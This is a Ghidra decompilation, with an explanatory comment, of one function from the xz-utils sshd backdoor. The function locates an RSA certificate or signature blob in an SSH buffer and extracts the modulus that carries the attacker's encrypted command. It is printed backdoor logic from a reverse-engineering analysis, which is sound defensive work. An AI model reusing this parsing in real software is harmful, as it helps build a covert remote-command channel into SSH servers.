// /home/kali/xzre-ghidra/xzregh/107F20_extract_payload_message.c
// Function: extract_payload_message @ 0x107F20
// Calling convention: unknown
// Prototype: undefined extract_payload_message(void)


/*
 * AutoDoc: Scans an sshbuf blob for either 'ssh-rsa-cert-v01@openssh.com' or 'rsa-sha2-256', walks the
 * surrounding length fields (network byte order), and ensures the modulus chunk fits within the
 * caller-provided buffer. When it finds a match it rewrites sshbuf->d to point at the modulus
 * payload and returns its size so the command decoder knows how many bytes to decrypt.
 */
#include "xzre_types.h"


undefined8 extract_payload_message(ulong *param_1,ulong param_2,ulong *param_3,long param_4)

{
  uint *puVar1;
  char cVar2;
  ulong uVar3;
  ulong uVar4;
  uint *puVar5;
  uint uVar6;
  long lVar7;
  long lVar8;
  uint *puVar9;
  ulong uVar10;
  char *cert_type;
  
  if ((param_1 == (ulong *)0x0) || (param_2 < 7)) {
    return 0;
  }
  if ((param_3 != (ulong *)0x0) && (param_4 != 0)) {
    if (*(long *)(param_4 + 0x38) == 0) {
      return 0;
    }
    if (*(long *)(param_4 + 0x40) == 0) {
      return 0;
    }
    uVar4 = *param_1;
    if (CARRY8(uVar4,param_2)) {
      return 0;
    }
    uVar3 = 0;
    do {
      lVar8 = uVar4 + uVar3;
      lVar7 = 0;
      uVar10 = param_2 - uVar3;
      while( TRUE ) {
        cVar2 = *(char *)(*(long *)(param_4 + 0x38) + lVar7);
        if ((*(char *)(lVar8 + lVar7) < cVar2) || (cVar2 < *(char *)(lVar8 + lVar7))) break;
        lVar7 = lVar7 + 1;
        if (lVar7 == 7) goto LAB_00107fd1;
      }
      lVar7 = 0;
      while( TRUE ) {
        cVar2 = *(char *)(*(long *)(param_4 + 0x40) + lVar7);
        if ((*(char *)(lVar8 + lVar7) < cVar2) || (cVar2 < *(char *)(lVar8 + lVar7))) break;
        lVar7 = lVar7 + 1;
        if (lVar7 == 7) goto LAB_00107fd1;
      }
      uVar3 = uVar3 + 1;
    } while (param_2 - uVar3 != 6);
    lVar8 = 0;
    uVar10 = 6;
LAB_00107fd1:
    if ((7 < uVar3) && (lVar8 != 0)) {
      uVar6 = *(uint *)(lVar8 + -8);
      uVar6 = uVar6 >> 0x18 | (uVar6 & 0xff0000) >> 8 | (uVar6 & 0xff00) << 8 | uVar6 << 0x18;
      if (0x10000 < uVar6) {
        return 0;
      }
      puVar1 = (uint *)(lVar8 + -8 + (ulong)uVar6);
      if ((uint *)(uVar4 + param_2) < puVar1) {
        return 0;
      }
      uVar4 = c_strnlen(lVar8,uVar10);
      if (uVar10 <= uVar4) {
        return 0;
      }
      puVar9 = (uint *)(lVar8 + uVar4);
      if (puVar1 <= puVar9) {
        return 0;
      }
      uVar6 = *puVar9;
      uVar6 = uVar6 >> 0x18 | (uVar6 & 0xff0000) >> 8 | (uVar6 & 0xff00) << 8 | uVar6 << 0x18;
      if (0x10000 < uVar6) {
        return 0;
      }
      puVar9 = (uint *)((long)puVar9 + (ulong)(uVar6 + 4));
      if (puVar1 <= puVar9) {
        return 0;
      }
      uVar6 = *puVar9;
      uVar6 = uVar6 >> 0x18 | (uVar6 & 0xff0000) >> 8 | (uVar6 & 0xff00) << 8 | uVar6 << 0x18;
      if (0x10000 < uVar6) {
        return 0;
      }
      puVar5 = puVar9 + 1;
      if ((uint *)((ulong)uVar6 + (long)puVar5) <= puVar1) {
        return 0;
      }
      if ((char)puVar9[1] == '\0') {
        puVar5 = (uint *)((long)puVar9 + 5);
        uVar6 = uVar6 - 1;
      }
      *param_1 = (ulong)puVar5;
      *param_3 = (ulong)uVar6;
      return 1;
    }
  }
  return 0;
}

